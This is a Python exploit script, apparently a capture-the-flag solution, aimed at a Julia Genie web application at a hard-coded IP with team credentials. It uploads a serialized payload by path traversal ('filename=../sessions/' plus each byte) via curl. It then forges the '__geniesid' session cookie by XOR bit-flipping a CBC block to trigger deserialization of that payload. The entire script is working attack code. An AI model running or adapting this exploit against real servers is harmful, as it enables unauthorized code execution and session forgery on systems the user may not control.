import requests
import os
import subprocess

if os.path.exists('./exp'):
    os.unlink('exp')

os.system('julia ./gen_session.jl')

with open("exp", "rb") as f:
    payload = f.read()

host ="http://34.81.46.184:10001"
auth = ('team1', 'C8nPSNxP1v6t+kgn')


# uploading serialized file to `sessions/<char>`
for i in range(1, 0xff):
    if chr(i) in ["/", "."]:
        continue
    # Using curl instead of requests library to prevent url encoding
    subprocess.run([
        'curl', f"{host}/upload", "-u", ':'.join(auth),
        "-F", b"file=@exp;filename=../sessions/"+bytes([i])
    ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    print("Uploading: ", i, "/", len(range(1, 0xff)), end='\r')

# You need to trigger the deserialization at least two times.
# But not all the request will be successful, so we try more.
for _ in range(4):
    r = requests.get(host, auth=auth)
    encrypted = bytes.fromhex(r.cookies["__geniesid"])
    print("Orignial session: ", encrypted.hex())

    def xor(a, b):
        return bytes([x ^ y for x, y in zip(a, b)])

    original_padding = b"\x10" * 16
    target = b"A"*15 + bytes([31])
    forged_block = xor(xor(original_padding, target), encrypted[-32:-16])

    forged_session = (forged_block + encrypted[-16:]).hex()
    print("Forged session: ", forged_session)

    try:
        requests.get(host, auth=auth, cookies=dict(
            __geniesid=forged_session
        ),  timeout=1)
    except:
        pass
